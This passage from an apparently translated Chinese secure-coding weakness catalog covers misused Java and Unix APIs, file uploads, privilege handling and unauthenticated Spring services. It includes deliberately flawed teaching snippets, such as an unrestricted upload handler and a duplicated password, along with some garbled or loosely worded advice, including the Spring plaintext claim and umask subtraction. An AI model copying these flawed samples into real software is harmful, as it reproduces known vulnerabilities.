<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3460 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3460 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3460 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3460 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3460 CAT I</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01)</p>
<h4 id="Often-Misused-Boolean-getBoolean"><a href="#Often-Misused-Boolean-getBoolean" class="headerlink" title="Often Misused: Boolean.getBoolean()"></a>Often Misused: Boolean.getBoolean()</h4><h5 id="ABSTRACT-37"><a href="#ABSTRACT-37" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>方法 Boolean.getBoolean() 常常与 Boolean.valueOf() 或 Boolean.parseBoolean() 方法调用混淆。</p>
<h5 id="EXPLANATION-37"><a href="#EXPLANATION-37" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在多数情况下，由于是用 Boolean.getBoolean() 来返回指定字符串变量表示的布尔值，因而导致此方法的调用使用不当。但是，正如 Javadoc Boolean.getBoolean(String) 方法所说，“当且仅当该参数表示的系统属性存在且等于字符串 ‘true’ 时，才会返回 true。”</p>
<p>绝大多数情况下，开发人员真正希望使用的是调用 Boolean.valueOf(String) 或 Boolean.parseBoolean(String) 方法。 例 1：下列代码将不会按照期望的方式运行。它会输出“FALSE”，因为 Boolean.getBoolean(String) 不会对基元型字符串进行转换。它只能对系统属性进行转换。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String isValid = &quot;true&quot;;</span><br><span class="line"></span><br><span class="line">if ( Boolean.getBoolean(isValid) ) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;TRUE&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;FALSE&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-37"><a href="#RECOMMENDATIONS-37" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请确保要调用的方法是 Boolean.getBoolean(String)，并且指定的字符串函数为系统属性。否则您希望使用的方法调用极有可能是 Boolean.valueOf(String) 或 Boolean.parseBoolean(String)。</p>
<h5 id="REFERENCES-35"><a href="#REFERENCES-35" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Class Boolean Oracle</p>
<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<h4 id="Often-Misused-Encoding"><a href="#Often-Misused-Encoding" class="headerlink" title="Often Misused: Encoding"></a>Often Misused: Encoding</h4><h5 id="EXPLANATION-38"><a href="#EXPLANATION-38" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>我们很容易相信此编码方法可保护系统免受注入攻击，但是如果未在正确的上下文中准确使用此方法，则其提供的保护会远逊于宣称的效果。</p>
<p>例 1：下列编码方法调用使攻击者可以利用其插入恶意 JavaScript 的机会较小：</p>
<p><code>out.println(&quot;x = &quot; + encoder.encodeForJavaScript(input) + &quot;;&quot;);</code></p>
<h5 id="RECOMMENDATIONS-38"><a href="#RECOMMENDATIONS-38" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>避免通过重新编写代码来调用此方法，要使用能够提供更强安全保证的其他验证或编码方法。</p>
<p>例 2：此代码将仅输出为 x 分配的整数值。</p>
<p><code>out.println(&quot;x = &quot; + validator.getValidInteger(&quot;int_in&quot;, input, 0, 1024, false) + &quot;;&quot;);</code></p>
<h5 id="REFERENCES-36"><a href="#REFERENCES-36" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP ESAPI Secure Coding Guideline</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 176</p>
<h4 id="Often-Misused-File-System"><a href="#Often-Misused-File-System" class="headerlink" title="Often Misused: File System"></a>Often Misused: File System</h4><h5 id="ABSTRACT-38"><a href="#ABSTRACT-38" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>由参数 umask() 指定的掩码常常很容易与 chmod() 的参数混淆。</p>
<h5 id="EXPLANATION-39"><a href="#EXPLANATION-39" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>umask() man page 以错误的指令开始：</p>
<p>“umask sets the umask to mask &amp; 0777”</p>
<p>尽管这种行为可以更好地遵从 chmod() 的用法，这种情况下，由用户提供的参数指定在特定文件上启用的位数，但事实上 umask() 的行为恰恰相反： umask() 将 umask 设为 ~mask &amp; 0777。</p>
<p>umask() man page 接下来描述了 umask() 的正确使用方法：</p>
<p>“open() 使用 umask 为新建文件设置初始文件权限。 具体而言，它会关闭 umask 从 mode 参数传递到 open(2) 的权限（例如，umask 的通用默认值 022 会导致以权限 0666 &amp; ~022 = 0644 = rw-r–r– 创建新文件，而在正常情况下，mode 应该为 0666）。”</p>
<h5 id="RECOMMENDATIONS-39"><a href="#RECOMMENDATIONS-39" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为计算正确的 umask 值，用 666 减去该 umask（用于文件），或用 777 减去该 umask（用于目录）。</p>
<p>确保 umask 值以“0”开头，以表明指定的是八进制值。 否则，会将 umask 值解析为十进制值。</p>
<h5 id="REFERENCES-37"><a href="#REFERENCES-37" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 249, CWE ID 560 </p>
<p>[2] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[3] Standards Mapping - OWASP Top 10 2004 A5 Buffer Overflow </p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.5 </p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.2 </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.2 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.2 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.2 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.2 </p>
<p>[11] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3590.1 CAT I </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3590.1 CAT I </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3590.1 CAT I </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3590.1 CAT I </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3590.1 CAT I </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3590.1 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3590.1 CAT I </p>
<h4 id="Often-Misused-File-Upload"><a href="#Often-Misused-File-Upload" class="headerlink" title="Often Misused: File Upload"></a>Often Misused: File Upload</h4><h5 id="ABSTRACT-39"><a href="#ABSTRACT-39" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户上传文件可能会让攻击者注入危险内容或恶意代码，并在服务器上运行。</p>
<h5 id="EXPLANATION-40"><a href="#EXPLANATION-40" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>无论编写程序所用的语言是什么，最具破坏性的攻击通常都会涉及执行远程代码，攻击者借此可在程序上下文中成功执行恶意代码。如果允许攻击者向某个可通过 Web 访问的目录上传文件，并能够将这些文件传递给代码解释器（如 JSP/ASPX/PHP），他们就能促使这些文件中包含的恶意代码在服务器上执行。</p>
<p>示例：以下 Spring MVC 控制器类包含可用于处理上传文件的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line"></span><br><span class="line">public class MyFormController &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/test&quot;)</span><br><span class="line"></span><br><span class="line">    public String uploadFile (org.springframework.web.multipart.MultipartFile file) &#123;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">    &#125;    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使程序将上传的文件存储在一个无法通过 Web 访问的目录中，攻击者仍然有可能通过向服务器环境引入恶意内容来发动其他攻击。如果程序容易出现 path manipulation、command injection 或危险的 file inclusion 漏洞，那么攻击者就可能上传带恶意内容的文件，并利用另一种漏洞促使程序读取或执行该文件。</p>
<h5 id="RECOMMENDATIONS-40"><a href="#RECOMMENDATIONS-40" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可以避免附件，请不要接受它们。如果程序必须接受附件，则应当只接受程序所需的特定类型的内容，从而阻止攻击者提供恶意内容。依赖于上传内容的攻击通常要求攻击者能够提供他们自行选择的内容。限制程序能够接受的内容，可以在最大程度上限制可能被攻击的范围。检查文件名、扩展名和文件内容，确保它们都是应用程序所需的，并可供应用程序使用。使攻击者难以确定上传文件的名称和位置。这种解决方法通常是因程序而异的，并且在以下几个方面各不相同：将上传的文件存储在一个目录中（目录名称是在程序初始化时通过强随机值生成的）、为每个上传的文件分配一个随机名称，以及利用数据库中的条目跟踪这些文件。</p>
<h5 id="REFERENCES-38"><a href="#REFERENCES-38" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Alla Bezroutchko Secure file upload in PHP web applications</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 434</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A3 Malicious File Execution</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.3</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 434</p>
<p>[17] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 434</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Often-Misused-Privilege-Management"><a href="#Often-Misused-Privilege-Management" class="headerlink" title="Often Misused: Privilege Management"></a>Often Misused: Privilege Management</h4><h5 id="ABSTRACT-40"><a href="#ABSTRACT-40" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>没有遵守最低权限原则会增加引发其他漏洞的风险。</p>
<h5 id="EXPLANATION-41"><a href="#EXPLANATION-41" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>利用 root 权限运行的程序已经造成了无数的 Unix 安全灾难。 仔细检查您的程序授权是否会引发安全问题十分必要，同样重要的是，对那些授予了权限的程序，应及时撤销其权限并返回至未授权状态，将因忽略漏洞而引发的损害控制到最小。</p>
<p>Privilege management 函数有时会以一些不明显的方式运行，并且它们在不同的平台上面会有较大差异。 当您从一个非 root 用户切换到另外一个用户时，这种差异会尤其明显。</p>
<p>信号处理程序以及产生的进程会以其所拥有进程的权限运行，所以在某进程以 root 权限运行时，如果触发某一个信号或执行子进程，则信号处理程序或者子进程将会以 root 权限运行。 因此，攻击者有可能利用这些提高的权限来进行更严重的破坏。</p>
<h5 id="RECOMMENDATIONS-41"><a href="#RECOMMENDATIONS-41" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果程序经过重写后可不需要 root 访问权限，请进行重写。</p>
<p>请在提高权限之前禁用信号，以避免信号处理代码以意外的权限运行。 在将权限降回用户权限后，可重新启用信号。</p>
<p>请尽可能在完成需要特定权限的操作后，通过立即调用一个非零参数的 setuid() 来丢弃权限。</p>
<p>在某些情况下，应用程序可能无法调用 setuid()/setgid() 来丢弃权限。 尤其当应用程序需要不断地以 root 身份代表用户来执行某些操作时，会发生这种情况。 比如，一个 FTP 进程需要绑定到 1 至 1024 之间的端口以便于为用户请求服务。 在此类情况下，应该使用 seteuid() 和 getegid() 来暂时降低到一个较低权限等级，并且保留在需要时返回为 root 权限的能力。 请注意，这同样会使攻击者很容易地将应用程序退回到 root 权限，所以当无法完全丢弃权限的时候，应该只使用 seteuid()/getegid()。</p>
<h5 id="REFERENCES-39"><a href="#REFERENCES-39" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] H. Chen, D. Wagner, and D. Dean. Setuid Demystified. 11th USENIX Security Symposium</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 250 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000381, CCI-002233, CCI-002235 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-6 Least Privilege (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.2.1 Authentication Architectural Requirements, 10.2.2 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 7.1.1 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 7.1.1 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 7.1.2 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 7.1.2 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 7.1.2 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 7.1.2 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[15] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 250 </p>
<p>[16] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 250 </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3500 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3500 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3500 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3500 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3500 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3500 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3500 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000500 CAT II, APSC-DV-000510 CAT I, APSC-DV-001500 CAT II </p>
<p>[34] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization </p>
<p>[35] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02) </p>
<h4 id="Often-Misused-Spring-Remote-Service"><a href="#Often-Misused-Spring-Remote-Service" class="headerlink" title="Often Misused: Spring Remote Service"></a>Often Misused: Spring Remote Service</h4><h5 id="ABSTRACT-41"><a href="#ABSTRACT-41" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>远程服务在 Spring 应用程序中配置。默认情况下，这些远程服务不要求身份验证，也不要求进出该服务器的信息必须是明文形式。这就使攻击者有机会访问需要特定权限的操作或者获取敏感数据。</p>
<h5 id="EXPLANATION-42"><a href="#EXPLANATION-42" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring 提供了一种简单的机制，可用于将任何 Spring 托管的 bean 转换为可通过 RMI、HTTP、Burlap、Hessian 和 JMX 等协议暴露给外部的对象。远程 Spring bean 的任何公共方法都支持外部调用，而且客户端与远程对象之间传递的数据都是明文形式。这些服务存在的主要问题是，它们在默认情况下是开放的，而且本身不提供任何保密性或完整性保证。</p>
<h5 id="RECOMMENDATIONS-42"><a href="#RECOMMENDATIONS-42" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>利用 Spring Security 和 SSL 提供 authentication、授权、保密性和完整性。</p>
<h5 id="REFERENCES-40"><a href="#REFERENCES-40" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Anirvan Chakraborty , Jessica Ditt , Aleksa Vukotic , Jan Machacek ProSpring 2.5</p>
<p>[2] Gary Mak , Daniel Rubio , Josh Long Spring Recipes</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 6.5.10</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4, Requirement 6.5.9</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3260 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Often-Misused-Spring-Web-Service"><a href="#Often-Misused-Spring-Web-Service" class="headerlink" title="Often Misused: Spring Web Service"></a>Often Misused: Spring Web Service</h4><h5 id="ABSTRACT-42"><a href="#ABSTRACT-42" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 服务在 Spring 应用程序中配置。默认情况下，这些 Web 服务不要求身份验证，也不要求进出该服务器的信息必须是明文形式。这就使攻击者有机会访问需要特定权限的操作或者获取敏感数据。</p>
<h5 id="EXPLANATION-43"><a href="#EXPLANATION-43" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring 提供了一种简单的机制，可用于将任何 Spring 托管的 bean 转换为通过 Spring WS 或 XFire 提供的 web 服务。远程 Spring bean 的任何公共方法都支持外部调用，而且客户端与承载 Web 服务的对象之间传递的数据都是明文形式。这些服务存在的主要问题是，它们在默认情况下是开放的，而且本身不提供任何保密性或完整性保证。</p>
<h5 id="RECOMMENDATIONS-43"><a href="#RECOMMENDATIONS-43" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>利用 Spring Security 和 SSL 提供 authentication、授权、保密性和完整性。</p>
<h5 id="REFERENCES-41"><a href="#REFERENCES-41" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Anirvan Chakraborty , Jessica Ditt , Aleksa Vukotic , Jan Machacek ProSpring 2.5</p>
<p>[2] Gary Mak , Daniel Rubio , Josh Long Spring Recipes</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 6.5.10</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4, Requirement 6.5.9</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4, Requirement 6.5.8</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3260 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II, APSC-DV-002360 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<p>Password Management: Weak Redundancy</p>
<p>ABSTRACT</p>
<p>应输入两次密码，而不是复制密码。</p>
<p>EXPLANATION</p>
<p>对于此 API，不应使用复制密码的方法。此 API 的目的在于确保用户不会输错密码。复制密码操作违反此安全机制。</p>
<p>例 1：</p>
<p>String password=request.getParameter(“password”);</p>
<p>…</p>
<p>DefaultUser user = (DefaultUser) ESAPI.authenticator().createUser(username, password, password);</p>
<p>RECOMMENDATIONS</p>
<p>用户应输入两次密码。</p>
<p>例 2：</p>
<p>String password_first=request.getParameter(“password_first_time”);</p>
<p>String password_second=request.getParameter(“password_second_time”);</p>
<p>…</p>
<p>DefaultUser user = (DefaultUser) ESAPI.authenticator().createUser(username, password_first, password_second);</p>
<p>REFERENCES</p>
<p>[1] OWASP ESAPI Secure Coding API: User</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 521</p>
<p>[3] Standards Mapping - FIPS200 IA</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1</p>
